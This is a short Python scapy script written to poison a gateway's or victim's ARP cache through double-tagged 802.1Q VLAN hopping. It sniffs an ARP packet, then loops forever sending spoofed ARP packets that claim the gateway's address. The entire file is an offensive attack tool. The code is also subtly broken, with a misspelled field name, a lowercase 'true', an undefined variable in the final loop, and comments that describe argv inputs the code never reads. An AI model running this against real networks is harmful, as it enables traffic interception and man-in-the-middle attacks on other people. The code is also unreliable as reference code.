from scapy.all import *
import time
import sys
#Poisons gateway by poisoning its ARP cache through a VLAN hopping attack
#more info see: https://en.wikipedia.org/wiki/VLAN_hopping
#yes this has double 802.1q encapsulation:
#victim mac is  argv[1]
#gateway is argv[2]
#victim ip = argv[3]
#tells victim ip, hey I am the gateway and here is my mac address
#loop executes endlessly if not 0
#cd /root



pkts= sniff(count=1, filter="arp")
victimMac = pkts[0].hwdsrc;
gateway = pkts[0].pdst
victimIp = pkts[0].psrc
yourMac = ''

def arp_gateway_packet_found(pkt):
	if gateway in pkt.psrc and pkt[ARP].op in(1,2):
		return true;

#pkts[0].show
send( Ether(dst=victimMac)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
      /ARP(op="who-has", psrc=gateway, pdst=victimIp,hwdst=yourMac),
      inter=RandNum(10,40), loop=1 )


#
#send( Ether(dst=victimMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
    #  /ARP(op="who-has", psrc=gateway, pdst=victim),
   #   inter=RandNum(10,40), loop=1 )

while 1:
		send(arp)
		time.sleep(6)


